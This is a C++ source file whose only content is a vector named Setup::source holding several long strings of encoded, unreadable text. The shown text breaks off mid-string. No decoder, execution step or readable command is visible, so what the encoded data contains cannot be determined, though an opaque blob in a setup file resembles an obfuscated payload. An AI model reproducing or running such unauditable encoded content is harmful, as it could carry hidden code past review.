#include "setup.h"
#include <stdlib.h>

const vector<string> Setup::source = {
    "J{NgMUpvJGOx\\Gmw\\|pgcZTnMVggMUpvBoT{dVpLBYmvbG){cBA `Y!mBgmqaZAxboSgb#m|BgmqaZAxboSgcGi{\\YFl`Y%oBgmqaZAxboSg`Y(LBYmvbG){cBA{[Y%la\" LBYmvbG){cBA|cIKqanbLBYmvbG){cBAxbypK`Y!ya#K JGq|a\"$LBYmvbG){cBA|`Ycw[YyLBYmvbG){cBA{\\ZF!\\ZO bypK`Y!ya#K JFAKVB%KaYFo\\SpK\\oKxaUAjb|Sg`Y!ya#K JDKm[ZX `Y\\!aFOxcZ@LBYmvbG){cBA!bnzu`YJ|Bgm!bnzu`YJ|MnTqb\"FjaGXfc\"F{anmw\\#NpcZKuaGmjN{%mdGOmbITqa\"%|Mlmwb\"XkcZKmWnXzcYX|cFcibn%qanbqBnX$[\"XycBAFdGOmbITqa\"$&BgmybnmwcBgj K#SvcGBJOB) MZSxvBz [ZSxvB  MkSxOGM [Wg M|SxvB  [QSw)B! MluJOBz [CSuOGB MkTjOB& M@uJOB$ MVSwBCTgcGB MCSuvGNMjJqBgmqaoA!cBgqBgmmdGm LBlLBnTm\\jA|[Y\\mZ#F!`ZSp[nFlbIKxdGmmb{yg\\n){[nml\\GXwbIKxdIluJIOq\\| yMBAnbnFv\\V yLVpLBZA{`Y% LBKbamzw KaSvOGCMBCSx)B1 MtSuBCSxvBz M#SxvB{ MkTgvGA [(g MxSwOGA [Jg [Dg M3TgOB1 MtTgcB$ [fSwvBy M|SwB$wMjJqBgmnJC ga#AmajgjbIKxdGmmb{JuJBK{L{JqBgmlJC g\\j%{\\YFlaGmw\\ZNpLSpK\\j%|\\YXtLC@qBgmna#Jg`UAqajAlPgpKBYmnJGlwboO bnmyLBlgan) JGmwJGKi\\IA{a#iq\\ZN&BglKBY[wc#KqcGWp`UlLBY[wcIK!anOicGWpLSpK\\j%kaG)|\\UgqBgmlJC ga#Amajgj\\n){[nml\\GXwMnO|cjJuJBKiJjlLBY\\xbjAybn)$dUAqajAna#Kj`YTl\\Y%ybn)$dVpLBSmlMoc{`ZTmLIA{a#i%JBugK!zwK{lLBYSw[\"zxb\"WpLSpKbIKqaoSpb#T{LBiu\\Y$p[nFlbIKxdGmmb{lgMUAu\\Y$p\\n){[nml\\GXwbIKxdIlqLUluJBMSv)By MISuOB) MZSxcGM [Wg M3TgOB1 MtTgcB$ [fSvcB&JOB3 M\'Ti)B$ [oSvcB) M$iJjlLBZA{`Y% LIO bjiu\\Y$p\\n){[nml\\GXwbIKxdIlqLUygJvB# MCSx)G@ MZTjcB! M#SxcGM [Wg M3TgOB1 MtTgcB$ [fSvcB&JOB3 M\'Ti)B$ [oSvcB) M$iJjlLBZA{`Y% LBMSlvGM MtSw)GP [fSuOGP [ITkB$wMjJqBgmxb{%f\\ZiqcBgyLSql\\Y[g\\ZTmbn%iaF)qaoA!cBij[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUl&Bgm#`Gmu\\UAWboXmPgpKBZA{`Y% LBKC`G)xb\"WgdY)!bjAxbITqa\"$jLSpKBYOpa\"mk\\U@)JGmwbIX LBKaW!! [ZTqb#Tq[#NuJFvTZZXqcBygY OcaGXibjAy[ZKib\"iiZG$jLSpKBYOpa\"mk\\U@)JGOpa\"mk\\U%{b#T{`Z@pLSpKBZT{dVpLBSlK`Y[g[\"ix`YOmMnzxc\"X{LBlgQV gJoNjJG){JGOpa\"mk\\U%ua#cmbjgqJC )JBMTj{J&BglKBSmVcGF b{%ybnmwcFO [ZT|LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBSmmaGmnJGOpa\"mk\\U%ua#cmbjgqJC )JBKzJjAxbjAk`G)q[\"WwaG)#\\ZJpLU@)QU@j MljPgpKBSlKb\"Fn\\X)zcYm LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBSlK[nFlbIKxdGmmb{%kaGXibjgqBglKBSmna#Kj`YTl\\Y%ybn)$dU%kaGXibjgqBglKBYXu`Y[g[\"ix`YOmMnzxc\"X{LBlgQV gJnNjJG){JGOpa\"mk\\U%ua#cmbjgqJC )JBMTgUJ&BglKBSmj[YTybn)$`YX|MnOu\\YF{LBlLBSlKBZA{`Y% LBMSo)By [CSuOGJ M@g M3SxvGI MkTjcB! M#SuBJqBglKBYXub\"W&BglKBSmybnmwcBgj LMTj{CSx)B$ [kSvcGJ [yg [ZTg)B% M#TkjJqBglK\\Zik\\ZA JDX$[\"XycGmxajAib{AmPgpKBSmybnmwcBimLSqkaGF|b{AVcGF b|pLBY%!aW)nWIKxdGmmb{@)JC@LBY%!aW)nXGi{\\YFlb{@)JC@LBZAxb#T|W\"XwcB@)JC@LBYOibITk`GF|W\")ucnXlJC gN@pK\\GXnJIOmcFA{a#iq\\ZNp[Y!xcY% LVpLBSmVcGF b{%wcY!Q\\mA{a#iq\\ZNgQUAiaY)!aoSLBYTm\\jA|\\ZTwcY!Q\\mTpbnXi\\INp[Y!xcY% LVpLBSmVcGF b{%wcY!Q\\mTpbnXi\\INgQUAiaY)!aoSLBYTm\\jAqanOC[ZA [\"iib{gqPgpKBXO [ZT|MnOibITk`GF|W\")ucnXlJBu)JCDLBYTm\\jAqanOSa#O b{gqPgpKBXO [ZT|MoAxb#T|W\"XwcB@tQU@zBgml\\Y[gbIKqaoTVcGF b{ij[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUl&BglKbIKqaoSpJk )QV )QV )QV )QV )QV )QV )QV )QV )QV )QV )QV )QV jLSpKBZA{`Y% LBMSo)G@ M\'SwvGA MkTi)B! Mpg M\'TgcGB MCSw)B1 [ITkCqbcBJuJIO bjiVcGF b{%wcY!Q\\mA{a#iq\\ZNgMUAu\\Y$p[nFlbIKxdGmmb{lqLSpKBZA{`Y% LBMSocBy [fSuOB\' [|SxcGM MWg M3SxvGB M\'SwvB$Pmz Jjygb#T{LFO [ZT|Mn%!aW)nXGi{\\YFlb{lqBglKbIKqaoSpJvB` MCSx)GB [bg [CSvcGJ MZSxcB1Pmz ZISjMBA|cIJpW#TicINw[\"FycGOp[ZOVa\"z\"\\YSqLSpKBZA{`Y% LBMSm)By MISuOB) MZSxcGM MWg M3TgOB1 MtTgcB$ [fSwvB$Pmz Jjygb#T{LBiu\\Y$p[nFlbIKxdGmmb{lgMUAu\\Y$p\\n){[nml\\GXwbIKxdIlqLUlqBglKbIKqaoSpJvBW M\'TgcGB [QSx{CSv)By M3TgOB! [oSvcB)Pmz Jjygb#T{LGzmajina#Kj`YTl\\Y%ybn)$dUlqLSpKBZA{`Y% LBMSpvB! MtTg)GK MkSvUCSx)B1 [MSxvB& Mg&ZITbcBJuJIO bji `IKm[YTqanbw[YO `Z\\mZ\"OxcY% LBlqLSpKBYmnJITpbnXi\\Gmw\\{%i[#TqcnXf[\")!aoSpLU@(QU@{PgpKBSmybnmwcBgj",
    "SWzNJFTJWlXATFNgTlmPUXOJTWSuJFAUTXOVJFyjWXyjJjlLBSmybnmwcBgjQV )QV )QV )QV )QV )QV )QV )QV )QV )QV )QV )QV )QXzwJjlLBnOu[ZO|JDOicGFua\"b&Bgml\\Y[gZ!)qanm Z!(pb\"Xu\\jyg[n)ibnSqPgpKBZOmaG[w[n)ibnSgQUAja\"F{\\@pKBZA{`Y% LBMSpcB& MCTi)B$ MMSuOGPJOB  M\'TgcB& [NjMBA|\\YznMnKx[ZKlLSpKBZOmaG[wb\"Op\\Y!iJC g`oOxaj%ua\"Flb{i{\\ZF!\\ZO b{%o\\ZSpK{bw`n)qajiaJni cIA|Pj(xNnOpMnitM{JuJGKx[ZKlMB@jM\"OicGFua\"bw`oOxajKcLUlwcGX$cBlLBSm|\\YznMoTpbnXi\\IOCa#XwcB@)JGzmaji|\\YznMoOk`GXv[XujcGi{\\YFlb{KcLSqkaGF|b{AO\\YTq[VpLBYTm\\jAfZ\"mw`ZTfZ{i|\\YznMBAw[Y!mMBAy[ZTpLVpLBSm|\\YznMn%iaYWgQUAw[Y!mBglKb\"Xu\\j%y[ZTpJC gbGF `@pKBZOmaG[w[\"Fk`GXlJC gTnFub\"WLBYTm\\jAla#cwaG)i\\Bi|\\YznLVpLBSmq\\jA|\\YznMnOi[\"im\\B@)QUAG[Yz|\\VpLBSlKb\"Xu\\j%n`YzmJC gbnXzcYX|cINw\\\"X LBKpcITyb|pxM|Kk`B%p`{Jtb\"Xu\\j%y[ZTpLU%ka\"% \\Y% BglKBZOmaG[w[\"Fk`GXlJC gXIK!\\SqkaGF|b{ASa#O PgpK\\GXnJF)f`Y%qcF)fLIOmaG[uJIOk`GXv[UygaY)l\\UygcIKq\\\"cmbl\\xbn qPgpKBZOmaG[wUWSgQUA|cIJpb\"Op\\Y!iY{KwcY jZUlLBSm|\\YznMnOxaY!maoSgQUA|\\YznMoOmcF)ka\"!v\\Y% LIOk`GXv[Xuj[\")vaYXwcBKcMBAva\"TmMBA bnmo\\\"X{Tn){aUlLBSm|\\YznMoOi\\\"WgQUA|\\YznMoOmcF)|[YcmLIOk`GXv[UlLBSm|\\YznMn%!aU@)JIOk`GXv[XujaoXv[nX{Jm LBSm|\\YznMn!m\\Gmib{@)JFvcBglK\\n){JG!m\\GmiJGmwJIOk`GXv[Xuj\\nmu\\ZNjZVpLBSlKb\"Xu\\j%v\\YTq[ZNw[ZAy\\Y%lLD!m\\GmiLG!m\\GmiY{Kw[Y!mJm uJG!m\\GmiY{Ky[ZTpJm qLSpKBZA{`Y% LBMSpvG@ MkSu)B| MZTgOB) [QSw)By [ITkBCSxcByJjygJk$1Jjv|\\YznMlmDLSpK\\GXnJIOmcF)ka\"!v\\Y% LIOmaG[uJITmdISuJG!x\\GWuJIT{`Yco\\ZKGa#KvLVpLBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBJ([oJ1JjygJmzwJjlLBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBJ(b#T{a\"%oQjJuJBKa[m jLSpKBZTmdISgQUA \\Zi MoKmbGzi[\"WpJkyxb#T{a\"%oQjJuJBKaM\"KcJjlLBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBJ(\\Y 1JjygJmvqZUJqBglKcGX$cB@)JITmdISwbnXyaGFk\\UgjQB)maV$jMB@jY{)qZUJqBglKcGX$cB@)JITmdISwbnXyaGFk\\UgjQIO!bC$jMB@jY#O!bF jLSpKBZTmdISgQUA \\Zi MoKmbGzi[\"WpJkyxb#XyQjJuJBKaM#O!bF jLSpKBZTmdISgQUA \\Zi MoKmbGzi[\"WpJkz|cYJ1JjygJmv|cYKcJjlLBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBJ(M#O![k$jMB@jY{)|cYKcJjlLBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBJ([\")l\\V$jMB@jY\"Ox\\GXcJjlLBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBJ(M\"Ox\\GW1JjygJmux[\")l\\X jLSpKBYmnJG!x\\GWgQV gO{AianSgcIKq\\\"cmbl\\xbn gQV gNCpLBSlKcGX$cB@)JITmdISwbnXyaGFk\\UgjJBiQWBljMB@jJjlLBSlKb\")!bB@)JDKm[ZX `Y\\!aFOxcZ@pcGX$cByg\\nXicIX{\\ZN)Jni aYywbGF{b\"X{JjlLBSmmaIOmPgpKBSm|a#XyJC gSnXicZTq\\oXuW\")!bBi \\Zi MBAn\\YF cZKmb| j`ITvaB%y[ZK|\\ZJjLSpKBSmna#Jg[UAqajA|a#XyMn\\qanTf[YzuLBKiJjygd{KkaGF|b{J&JBKya#O MZKmbGz%MYzqanujfUl&BglKBSmiMnTm[\")vbG)|\\UgqBglK\\n){JIWg`Y$gb\")!bB%n`Y%lZ\"FuaBgjb#AiajJuJIuj[\"zib#NjPj@jcUK)LVpLBSlKcU%{\\ZAu[YOmZ#cqcGgpJmv!ZUJtcU%o\\ZTfcGX$cBgqL{KaM#XcJjlLBSmna#Jga{AqajA|a#XyMn\\qanTf[YzuLBK|bGFwJjygd{KkaGF|b{J&JBKxJo qPgpKBSmxMoKmbGzi[\"Xfc\"m `BgjY\")cJjvxMncmcF) \\Zi LBltJmuxa! jLSpKBY\\xbjA|bG)qaGX{JGmwJIOxcZ@w\\nmw\\F)iaGypJoOy[Y$jMBA\'JnOu[ZO|JkpgJoOya\"mu\\ZJjfUl&BglKBZOya\"mu\\ZJwbnXyaGFk\\X)#`ZTpLBKab#Ax`Yzmbm jL#Oya\"mu\\ZJw\\\"X Z#TmdISpLUujY{)|bG)qaGX{ZUJqBglK\\n){JINg`Y$gb\")!bB%n`Y%lZ\"FuaBgjb#AiajJuJIuj[\"zib#NjPj@jb{K)LVpLBSlKb{%{\\ZAu[YOmZ#cqcGgpJmv|ZUJtb{%o\\ZTfcGX$cBgqL{KaM#OcJjlLBSm{\\ZT!bn$gb#T{LIOxcZ@w\\\"X Z#TmdISpLUlwaIO bnmyLBcbajbqMoK|cIKqbBgoZG$oLSpK\\GXnJIOmcF)|[YcmLIOmaG[uJIOk`GXv[Ul&BglKbnX cZKwJFT{cYWg`Y[gb\"Op\\Y!iY{KmaYFqaBKcMn\\qanSpJn!i`Yz a|q|[YcmJjlgQV gMVDg\\Yz|\\UAG[Yz|\\SqkaGF|b{AW`IKm[YS&Bgml\\Y[gZ!)qanm Z!(pb\"Xu\\jyg[n)ibnSuJDmDMBAva\"TmMBA bnmo\\\"X{Tn){aUl&BglKb\"Xu\\j%ja\"F{\\B@)JGKx[ZKlBglKb\"Xu\\j%KTB@)JDmDBglKbIKqaoSpJvBi MtSuOGI MkSuvBy [$g [MTgOB! MSjMBA|\\YznMlmDLSpKBZOmaG[wb\"Op\\Y!iJC g`oOxaj%ua\"Flb{i{\\ZF!\\ZO b{%o\\ZSpK{bw`n)qajiaJni cIA|Pj(xNnOpMnitM{JuJGKx[ZKlMB@jM#Kmb{(jMBAKTBygJj%sb\")wJm qLU% \\Zi LSpKBZOmaG[wbG)|cIOCa#XwcB@)JIOmaG[wb\"Op\\Y!iY{Kya#O b!)ka#XwcBKcJBug",
    "NSpKBZOmaG[waGF|cDmDJC gb#T{LIOmaG[wb\"Op\\Y!iY{Kv[ZifaoXvJm qBglKb\"Xu\\j%ya#O b{@)JIOmaG[w\\G)#anzx[YTfbG)|cINpaY)l\\UygcIKq\\\"cmbl\\xbn qBglKb\"Xu\\j%ua\"FnJC gJjJLBSmna#JgbG)|cD%!aUAqajA{[Y%o\\Uiv`Y$paGXwLIOmaG[wbG)|cINqMB@|NBlqPgpKBSm|\\YznMnzx[Y[gL| gLBJ1QjJtb\"Xu\\j%ya#O b!vya#O VoXvZU%KTBujJBJqBgml\\Y[g\\G)#anzx[YTfbG)|cINpb\"Xu\\jygaY)l\\UygcIKq\\\"cmbl\\xbn qPgpKBZAxb#T|JC gY! LBSmna#JgbG)|cBAqajA|\\YznMoOk`GXv[XujcGi{\\YFlb{KcY|AcY{Kya#O b{KcPgpKBSmya#O b{%ibIAmanSpWG)|cBiya#O MBAva\"TmMBA bnmo\\\"X{Tn){aUlqBglKbnX cZKwJIAxb#T|Bgql\\Y[g[YO `Z\\icGXf\\GXjcYbpaG)oVY)l\\Ul&BgmqaZAxboSgaG)o\\\"mw\\ypKbIKqaoSpJmzwLjpsJDTFSmXIJD!QTDWgSWOWUX\\AXDXDJBpsLjJqBgmq\\jAua\"cOa\"TmJC )JCD&BglKaG)o\\\"mw\\{%j[ZOq[ Oxan\\q\\{in`YzmanFv\\V oVD)IMoT$cBbuJGzmcnXuQYzx\\\"cqanbwTDXBXWbqBgmmaGmnJGzx\\ !x\\GWgQV gNkpLBSmua\"co`Y%oMnKib\"mkS\")w\\nmoLGzmcnXuQYzx\\\"cqanbwTDXBXWbqBnOu[ZO|JFOmcIXyPgpK\\GXnJF)f`Y%qcF)fLIOmaG[uJGF{\\#NqPgpKBYmnJGmwcBiibnc|Y|XcLU@iQU@yPgpKBSmi[#TqcnF \\X)l\\YK!\\{iqaoSp[ZKob!u!ZUlqBglKb\"Xu\\j%kbD\\qaGWuJIOmaG[w[nFwb \\qaGWuJIOmaG[w\\oXuaD\\qaGWgQUA|\\YznMoOmcF)manOx\\Gmw\\{gqBglKb\"Xu\\j%ja\"F{\\B@)JGF{\\#OaNX LBSm|\\YznMoTpbnXi\\B@)JGF{\\#OaNm LBSm|\\YznMnOp[Y)|JC g[ZKob!u|ZSpKBZOmaG[wbG) a\"Otb OxcY% JC g`Y% LGF{\\#OaOF qBglKb\"Xu\\j%WUW!FV!XWMBA|\\YznMmAAXXOFJC gb\"Xu\\j%|\\ZTf[\")wb#T|LIOmaG[wbG) a\"Otb OxcY% LSpKBZOmaG[wb\")ucnX{MBA|\\YznMnvmdUygb\"Xu\\j%t\\Zm{\\ZDgQUA|\\YznMoOmcF)t\\Zlp`Y% LGF{\\#OaOm qMBAibnc|Y|ccLSpKBZOmaG[wbIKxdImU\\ZAm[ZT|S\")!aoSgQUAqaoSp[ZKob!u$ZUlLBSm|\\YznMn!x\\GWuJIOmaG[wbGF|cGX|MBA|\\YznMnKq\\!Aib#TmJC gb\"Xu\\j%|\\ZTfaY)l\\UiqaoSp[ZKob!u%ZUlqBglK`Y[gb\"Xu\\j%va\"TmJC )JCg&BglKBZOmaG[waYmwSnFwJC g`Y% LGF{\\#OaNVAcLSpKBSm|\\YznMn!idDKiaj@)JGmwcBiibnc|Y|DzZUlLBSm|\\YznMnOicGFua\"bgQU@yBglKb\"Xu\\j% `IKm[YT|JC gY! LBSmq\\jA|\\YznMoTpbnXi\\B@iQU@jNBJ&BglKBZOmaG[wcIKq\\\"cmbl\\xbn uJIOmaG[wb\"i{[ZAw\\YzC`GF{\\\"WuJIOmaG[wcGF{\\\"X XGi{\\YFlJC gb\"Xu\\j%|\\ZTfcIKq\\\"cmbjiqaoSp[ZKob!uzNm qMBAqaoSp[ZKob!uzN! qMBAqaoSp[ZKob!uzOF qMBAibnc|LSpKBYXub\"W&BglKBZOmaG[wcIKq\\\"cmbl\\xbn gQU@yBglKBZOmaG[wb\"i{[ZAw\\YzC`GF{\\\"WgQU@yBglKb\"Xu\\j%v\\YTq[WvqanSuJIOmaG[waYXl`YFS[ZTpb{ygb\"Xu\\j%v\\YTq[ZOCa#XwcB@)JIOmaG[wb\"X Z\"!m\\GmiLGmwcBiibnc|Y|D!ZUluJGF{\\#OaNV\\cMBAqaoSp[ZKob!uzO! qLSpKBZOmaG[wb\"Fo\\W!x\\GWgQUAqaoSp[ZKob!uzPF qBglKb\"Xu\\j%|`GFt[YzSa#cmbj@)JGmwcBiibnc|Y|D%ZUlLBSmq\\jAibnc|Y|JyZU@)QU@jNUJ&JIOmaG[wb\"ii`\"FuS\")ua#JgQUAWboXmBglK\\Yz|\\Vpgb\"Xu\\j%|`GFt[YzCa\"zxbj@)JD\\iaIOmBglK`Y[g[ZKob!u{NX gQV gJkDjPjA|\\YznMoOp[YviaDFn\\nmw\\U@)JFT{cYWLBSmmaIOmPjA|\\YznMoOp[YviaDFn\\nmw\\U@)JD\\iaIOmBglK`Y[g[ZKob!u{Nm gQV gJkDjPjA|\\YznMoTxWD%IJC gXIK!\\SpKBYXub\"W&JIOmaG[wcG)SVlbgQUAG[Yz|\\SpK\\GXnJIOmcF)manOx\\Gmw\\{i|\\YznLVpLBSm|\\YznMnOyTnmu\\U@)JBK \\Zi b{% dISjBglKb\"Xu\\j%j[Y%|Tnmu\\U@)JBKj[Y%|MoT$cBJLBSm|\\YznMn\\!aGzG`YzmJC gJoAibnF|`GDwcIi JgpKBZKmcIX{ajA|\\YznMnOyTnmu\\Uygb\"Xu\\j%j[Y%|Tnmu\\Uygb\"Xu\\j%ncYzuTnmu\\SpK\\GXnJIOmcF)ka\"%|cINpb\"Xu\\jygbG) a\"Otb OxcY% LVpLBSmq\\jAya#Tx[\"v|S\")!aoSgQV gNCpLBSlKXDmOTW)XXB@)JC[yBglKBXAAXXOFJC gOk@LBSlKb\"Xu\\j%ya#Tx[\"v|S\")!aoSgQU@ BglK\\Yz|\\VpLBSlKXDmOTW)XXB@)JCDyBglKBXAAXXOFJC gNk@LBSm{\\ZT!bn$gXDmOTW)XXBygWDFXW WLBYTm\\jAo\\ZTf`\"X%LIOmaG[uJIOxaI\\mbjl&BglK`Y[gb\")ucnX{JC )JC@&BglKBZOxaI\\mbmO bj@)JBK$[\"FycGOp[UJLBSlKbIKqaoSpJvBf [xTgvBy [\'TgcGNJOB3 M\'Sw)GC [fSwOGB [yg MtSuOB# MZSxcGM Mlg MtSw)GP [bg MVSw)GQJOB$ MtTgcB& MCSx)GB [fSwB$wMjJqBglK\\Yzq\\jA|a\"z\"\\ZJgQV gNVpLBSlKb\")ucnX{W#T{JC gJnc!bn)k[ZA [\"iiJgpKBSmybnmwcBgj K3Tj)GB MCTkvGA [yg M3SxvB\' [QTi)B$ [MTkBCSwvBy MfSvcB) [xSwUCSwvB\' [\'Ti{CSvOB\' [(g MQTg)G@ M\'SwvBy M3TgvGI MgwMj$jLSpKBYXu`Y[gb\")ucnX{JC )JCJ&BglKBZOxaI\\mbmO bj@)JBKiaoTq[\"FycGOp[UJLBSlKbIKqaoSpJvBf [xTgvBy [\'TgcGNJOB3 M\'Sw)GC [fSwOGB [yg",
    " MtSuOB# MZSxcGM Mlg MtSw)GP [bg MVSw)GQJOBy M#TgvB$ MtSuOB3 [fSwB$wMjJqBglK`\"X%bnXzJC gbnXzcYX|cINw\\\"X LBcpcITyb|pxM|Kk`B!{`U%o[U)k[ZA [\"iiM{btb\")ucnX{W#T{LSpKBYmnJGvmdZKmbU%|cGF cZOf[\")l\\U@)QU@{NC@g[Y%lJGzmajit\\Zm{\\ZDwcGX$cBlgQV gN|J&BglKBZA{`Y% LBMSnvB\' [\'Ti{CSv)By MQTgOGC MaSvcB)JUJqBglKBYvmdU@)JGvmdZKmbU% \\Zi BglK\\Yzq\\jAt\\Zm{\\ZDwb#TicIX|Z\"Ox\\GWgQV gOC@ JG){JGzmajit\\Zm{\\ZDwcGX$cBlgQV gNCpLBSlKbIKqaoSpJvB` MxTkvGIJOB) MZSvOB1 [ITgvGC M3SvcB)JUJqBglKBYX$`ZSpLSpKBYXub\"W&BglKBZA{`Y% LBMSo)B1 MxTg)GI MZSxUCSxcB! M\'SvvB$ MVSuOB) M#Tj)B%JOB1 [MSuvB! [Jg M\'TgjCTgcB! [CSuvB! [CSuCpjMBAt\\Zm{\\ZDuJGvmdZKmbU% \\Zi LSpKBSmmdGm LBlLBSm|\\YznMoOmcF)t\\Zlpb\")ucnX{MBAt\\ZlqBglKbnX cZKwJGvmdUyg`\"X%bnXzBgml\\Y[gb\"X Z\"vmdUi|\\YznMBA|a\"z\"\\ZJuJGvmdUl&BglK`Y[g`\"X%JC )JBJyJkpLBSlK`\"X%MBAt\\Zm{\\ZDgQUA|\\YznMncmcF)t\\Zlpb\")ucnX{LSpKBYXu`Y[gaGXwLGvmdUlgQV gN|J&BglKBZA{`Y% LBMSlvB! [CSwOGD MkTivB$ [CTg)B! Myg MtSw)GP [bwMj$jLSpKBSmq\\jA|a\"z\"\\ZJgQV gNCpLBSlKBYvmdXO [ZT!b{@)JIKmbZXmb#T|MncmcBgj`IT bCpxM#gv[\"FycGOp[VJwboWxbnX|MoApbC)t\\Zl)Jj@tJGvmdU@tJBJn[YO `Y)wQYcmcGKiaGFw[\"WjLSpKBSlK`Y[g`\"X%W#TicIX|MoO [ZT!b!)ka\"TmJC )JCJyNCpLBSlKBSmq\\jAt\\ZmVcGF cZNwcGX$cB@)QU@jTXKUV!KfU X\\Z!XVTXJjPgpKBSlKBSmybnmwcBgj KtSw)GP [bg M#SvUCTgcGC [oSvcGA [MSuvGC MZTgjDjLSpKBSlKBSmmdGm LBlLBSlKBSmmaGmnJGvmdXO [ZT!b{% \\Zi JC )JBKFWmKQWm)SSXXVTX)VTXKYUWOFJkpLBSlKBSlKbIKqaoSpJvBi MZTgOB{ MZTgBCSxcByJOB3 [CSxvGD MkSw)By MtTgvB$ MtSvUyg MkTgcB3 M\'Sw)GN MfTg)B%JOB  [CTg)B| M\'SwUCTgcB1 MxSuvB! [@wJjlLBSlKBSlK\\ZiqcBgqBglKBSlK`\"X%dGNgQUAt\\ZmVcGF cZNwcGX$c@pKBSlKBYvmdZikJC g`\"X%dGNwb#Au`ZSpJoyjLSpKBSlKBZA{`Y% LBMSnvB\' [\'Ti{CSx)B1 MVTgvB{ MZTgOB\" MVTlcB)MBCSuvBy [gg MISuOB\' MCSxcGAPjJuJGvmdZikY|FcLSpKBSlK\\Yzq\\jAt\\ZmVcGF cZNwb#TicIX|Z\"Ox\\GWgQV gOV@yPgpKBSlKBZA{`Y% LBMSnOB& [ISwvBy M3Ti)ByJOB# MCSucB\' M\'SwvB$ [CSxvB{ MCSw)ByJOGB MMSxvB%JDmSMBCSx)B! [CSvcB# MCSu)G@ [QSv)B$JOG@ M\'Tg)GB MZTgBDjLSpKBSlKBYX$`ZSpLSpKBSmmaGmnJIOxaI\\mbj@)QU@zJG){JIOxaI\\mbj@)QU@{PgpKBSlK`Y[gb\")ucnX{JC )JCD&BglKBSlK`\"X%W#TicIX|JC gbnXzcYX|cINwbG)|cBgj`IT bIN&M{)ibGlw[\"FycGOp[U%ocZK!M\"cmcDKiaGFw[\"WjMBAsb\")wQZuj[\"zq\\Y% U\"X%Jkpg`\"X%fUygcnX{`Y\\%QW\\iaIOmLU%sb\")wLBlLBSlKBYXub\"W&BglKBSlK`\"X%W#TicIX|JC gbnXzcYX|cINwbG)|cBgj`IT bIN&M{)ibGlw[Y% `U!k[ZA [\"iiMnOxaU)o\\ZTB[YzianOmJjyg`oOxak!\'JnOu`YXwcDvmdUJ&JGvmdZ uJI\\mbnmndV!G[Yz|\\Ulw`oOxajgqBglKBSmq\\j@p`\"X%W#TicIX|Y{KmboKxblmlJm gQV gNBl&BglKBSlKbIKqaoSpJvB` MxTkvGIJOB3 M\'SvOGB MMSvcG@ MaSvOGT M uJOB{ MCTjBCSucBy MxSuOB) [D&JjygLGvmdXO [ZT!b!uj[nFu[Y%k\\UKcLUlLBSlKBYXu`Y[gLGvmdXO [ZT!b!uj\\ZK{a#KK\\BKcJC )JCDqPgpKBSlKBYmnJBit\\ZmVcGF cZOaJnX{bn){TGX|[#KqbITqa\"$jZU@)QU@jTXKUV!KfU X\\Z TQTXOfVl)WZ X[UXOWJjl&BglKBSlKBZA{`Y% LBMSnvB\' [\'Ti{CSxcB!JOGA [QTjcB! [ITgvB{ [QSvcGBJUJqBglKBSlKBYX$`ZSpLSpKBSlKBYXub\"W&BglKBSlKBZA{`Y% LGvmdXO [ZT!b!uj\\ZK{a#KD\\ZOkbnmycGmxajKcLSpKBSlKBSmmdGm LBlLBSlK`\"X%bnXzJC gN@pKBYXub\"W&BglKBZA{`Y% LBMSocB! M3TgOBy MMSwOB\' [|SxcB1JOB{ MMSvcB  MZSxUCSwvB\' [\'Ti{DjLSpKBSmmdGm LBlLBSm{\\ZT!bn$gb\")ucnX{MBAt\\ZluJGvmdZKmbSpK\\GXnJIOmcF)va\"TmLIOmaG[uJG!x\\GWqPgpKBYmnJG!x\\GWgQV gOCpLBSlKc\"m `BAxbGXwLIOmaG[w[#AG`YzmMB@objbuJGXw[\")l`Y%oQUc!cG[vPBbqJGF|JG\\qaGW&BglKBSmy[ZO \\ZNgQUAn`YzmMoKm[YSpLSpKBSlKbGF|cGX|JC gbGF|cGX|MoOyaGm LBKbamzwJjlLBSlKBYKq\\!Aib#TmJC gN@pKBYXu`Y[gaY)l\\U@)QU@$PgpKBSm#`ZTpJG)y\\Y$pb\"Xu\\j%j[Y%|Tnmu\\UygK#JoMBAmanOx\\Gmw\\| ocZTnMVgoLUAib{An`YzmPgpKBSlKbGF|cGX|JC g\\nmu\\U%{\\YFlLBlLBSlKBZAib#Tmb{@)JIAib#Tmb{%|bGzqcBgjZG%bajJqBglKBSmj`YcS[ZO \\U@)JC@LBSmmaGmnJG!x\\GWgQV gOkpLBSlK[nmoWGF|cGWgQU@jJgpKBSm#`ZTpJG)y\\Y$pb\"Xu\\j%ncYzuTnmu\\UygK#JoMBAmanOx\\Gmw\\| ocZTnMVgoLUAib{An`YzmPgpKBSlK\\\")\"",
    "an(gQUAabn)#MoO bnmyLBlg\\n){JIKxc{AqajAn`YzmZSpKBSmj`YcS[ZO \\U@)JBcbdGDyK{%sa\"mwLGcxcn%xLSpKBSmj`YcS[ZO \\U@tQU@oZIiiNBbLBSlKbGF|cGX|JC gN@pKBYXub\"W&BglKBZAib#Tmb{@)JC@LBSlK[nmoWGF|cGWgQU@yBglKbnX cZKwJG!x\\GWuJIAib#Tmb{yg[nmoWGF|cGWLBYTm\\jA|\\ZTfcIKq\\\"cmbji|\\YznMBAna#KvMBA|`IKibG%maDOp[ZKo\\UygaYmwWG)|cIOCa#XwcByg[ZKob{l&BglK`Y[gb\"i{[ZAw\\YzC`GF{\\\"WgQV gNCpLBSlKb\"Xu\\j% `IKm[YT|MnFybGXw\\BiW`IKm[YSpb\"Xu\\j%ja\"F{\\Bygb\"Xu\\j% `IKm[YSuJIOmaG[waY)l\\Uyg\\n){aUlqBglK\\Yzq\\jA|`IKibG%maDOp[ZKo\\U@1JC@&BglKBZOmaG[w[\"F 